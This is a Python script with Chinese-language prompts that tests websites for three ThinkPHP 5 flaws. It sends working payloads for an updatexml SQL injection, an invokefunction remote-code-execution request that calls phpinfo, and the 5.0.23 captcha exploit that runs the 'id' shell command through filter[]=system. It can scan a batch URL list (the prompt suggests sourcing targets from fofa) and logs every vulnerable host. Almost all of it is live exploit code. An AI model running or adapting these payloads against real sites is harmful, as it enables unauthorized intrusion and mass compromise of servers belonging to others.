import requests
from lxml import etree
import re
import sys
import  time
header = {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
}

def ThinkPHP5_SQL_Injection(url): #ThinkPHP5 SQL Injection
    print("正在进行ThinkPHP5 SQL Injection检测->"+url)
    result=[]
    if ("http://" in url) or ("https://" in url):
        if url.find('/', 7) == -1:  # 形如 https://a.com or http://a.com
            payload = url + '/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1'
        else:  # 形如 https://a.com/.... or http://a.com/.....
            side_Num = url.find('/', 7)
            payload = url[0:side_Num] + '/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1'
    else:  # 形如 127.0.0.1/.... or  127.0.0.1
        side_Num = url.find('/')
        if side_Num == -1:  # 形如 127.0.0.1
            payload = ''.join('http://') + url + '/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1'
        else:  # 形如 127.0.0.1/.....
            payload = ''.join('http://') + url[0:side_Num] + '/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1'
    print("payload为-->" + payload)
    try :
        respon = requests.get(payload, headers=header).content.decode('utf-8')
        soup = etree.HTML(respon)
        result = soup.xpath('//tbody//text()')
    except Exception as Error:
        print("如果这是ThinkPHP站点，那么可能存在WAF，或者不存在漏洞\n")
        return
    list = []
    for i in result:
        string = i.replace(' ', '').replace('\n', '').replace('[', '').replace(']', '')
        string = re.sub(r'[0-9]+', '', string)
        if len(string) != 0:
            list.append(string)
    try:
        Num=list.index('type')
        list=list[Num:Num+10:1]
    except Exception as Error:
        print("未检测出ThinkPHP5 SQL Injection漏洞，有WAF或者其他原因，请手动访问payload验证！\n")
        return 0
    if len(list) ==0:
        print("未检测出ThinkPHP5 SQL Injection漏洞，有WAF或者其他原因，请手动访问payload验证！\n")
    else:
        print("ThinkPHP5 SQL Injection漏洞存在！\n")
        print(list)
        return 1

def ThinkPHP_5_rce(url):    #Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability
    print("正在检测Thinkphp5 5.0.22/5.1.29 Remote Code Execution ->" + url)
    if ("http://" in url) or ("https://" in url):
        if url.find('/', 7) == -1:  # 形如 https://a.com or http://a.com
            payload = url + '/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1'
        else:  # 形如 https://a.com/.... or http://a.com/.....
            side_Num = url.find('/', 7)
            payload = url[0:side_Num] + '/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1'
    else:  # 形如 127.0.0.1/.... or  127.0.0.1
        side_Num = url.find('/')
        if side_Num == -1:  # 形如 127.0.0.1
            payload = ''.join(
                'http://') + url + '/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1'
        else:  # 形如 127.0.0.1/.....
            payload = ''.join('http://') + url[0:side_Num] + '/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1'
    print("payload为-->" + payload)
    try:
        respon = requests.get(payload, headers=header).content.decode('utf-8')
        #print(respon)
    except Exception as ERROR:
        print('如果这是ThinkPHP站点，那么可能存在WAF，或者不存在漏洞\n')
        return 0
    if "PHP Version" in respon:
        print("Thinkphp5 5.0.22/5.1.29 Remote Code Execution漏洞存在,访问payload即可查看PHPinfo信息\n")
        return 1
    else:
        print("未发现Thinkphp5 5.0.22/5.1.29 Remote Code Execution漏洞，或者存在WAF，请手动访问payload验证！\n")

def ThinkPHP_5_0_23_rce(url):#ThinkPHP5 5.0.23 Remote Code Execution Vulnerability
    print("正在检测ThinkPHP5 5.0.23 Remote Code Execution Vulnerability ->" + url)
    if ("http://" in url) or ("https://" in url):
        if url.find('/', 7) == -1:  # 形如 https://a.com or http://a.com
            payload = url + '/index.php?s=captcha'
        else:  # 形如 https://a.com/.... or http://a.com/.....
            side_Num = url.find('/', 7)
            payload = url[0:side_Num] + '/index.php?s=captcha'
    else:  # 形如 127.0.0.1/.... or  127.0.0.1
        side_Num = url.find('/')
        if side_Num == -1:  # 形如 127.0.0.1
            payload = ''.join(
                'http://') + url + '/index.php?s=captcha'
        else:  # 形如 127.0.0.1/.....
            payload = ''.join('http://') + url[0:side_Num] + '/index.php?s=captcha'
    print("payload为-->" + payload)
    data={
        "_method" : "__construct", "filter[]" : "system" , "method" : "get" , "server[REQUEST_METHOD]" : "id"
    }
    try :
        respon=requests.post(payload,data=data).text
        #result=requests.post(payload,data=data).content.decode('utf-8')
        #print(result)
    except Exception as Error:
        print('如果这是ThinkPHP站点，那么可能存在WAF，或者不存在漏洞\n')
        return 0
    if "uid" in respon and "gid" in respon and "groups" in respon:
        print("ThinkPHP5 5.0.23 Remote Code Execution漏洞存在！\n")
        return 1
    else :
        print("未发现ThinkPHP5 5.0.23 Remote Code Execution漏洞，或者存在WAF，请手动访问payload验证！\n")

if __name__ == '__main__':
    print("批量URL检测(默认打开当前目录下的url.txt,可搭配fofa使用) -> 1 \n"+"单个URL检测 -> 2 \n")
    Options_code=int(input("请输入你的选择："))
    try:
        if Options_code == 1:   #批量URL检测
            print("欢迎使用thinkPHP漏洞验证脚本\n" + "小孩子才做选择，我全都要！ -> 0\n" + "ThinkPHP5_SQL_Injection -> 1\n" + "ThinkPHP_5_rce -> 2\n" + "ThinkPHP_5_0_23_rce -> 3\n")
            def_Num = int(input("请输入你的选择："))
            for url in open('url.txt'):
                url = url.replace('\n', '')
                with open(r'ThinkPHP_vuln.txt', 'a+') as f:
                    if def_Num == 0:
                        if ThinkPHP5_SQL_Injection(url) ==1:
                            f.write(url+" 存在ThinkPHP5_SQL_Injection漏洞\n")
                            time.sleep(1)
                        if ThinkPHP_5_rce(url) == 1:
                            f.write(url + " 存在ThinkPHP_5_rce漏洞\n")
                            time.sleep(1)
                        if ThinkPHP_5_0_23_rce(url) == 1:
                            f.write(url + " 存在ThinkPHP_5_0_23_rce漏洞\n")
                            time.sleep(1)
                    if def_Num == 1:
                        if ThinkPHP5_SQL_Injection(url) == 1:
                            f.write(url + " 存在ThinkPHP5_SQL_Injection漏洞\n")
                            time.sleep(1)
                    if def_Num == 2:
                        if ThinkPHP_5_rce(url) == 1:
                            f.write(url + " 存在ThinkPHP_5_rce漏洞\n")
                            time.sleep(1)
                    if def_Num == 3:
                        if ThinkPHP_5_0_23_rce(url) == 1:
                            f.write(url + " 存在ThinkPHP_5_0_23_rce漏洞\n")
                            time.sleep(1)
        if Options_code == 2:   #单个URL检测
            print("欢迎使用thinkPHP漏洞验证脚本\n" + "小孩子才做选择，我全都要！ -> 0\n" + "ThinkPHP5_SQL_Injection -> 1\n" + "ThinkPHP_5_rce -> 2\n" + "ThinkPHP_5_0_23_rce -> 3\n")
            def_Num = int(input("请输入你的选择："))
            if def_Num == 0 :
                url = str(input("请输入URL:"))
                ThinkPHP5_SQL_Injection(url)
                ThinkPHP_5_rce(url)
                ThinkPHP_5_0_23_rce(url)
                sys.exit()
            if def_Num == 1:
                url = str(input("请输入URL:"))
                ThinkPHP5_SQL_Injection(url)
                sys.exit()
            if def_Num == 2:
                url = str(input("请输入URL:"))
                ThinkPHP_5_rce(url)
                sys.exit()
            if def_Num == 3:
                url = str(input("请输入URL:"))
                ThinkPHP_5_0_23_rce(url)
                sys.exit()
    except Exception as Error:
        print("输入有误！")
        sys.exit()
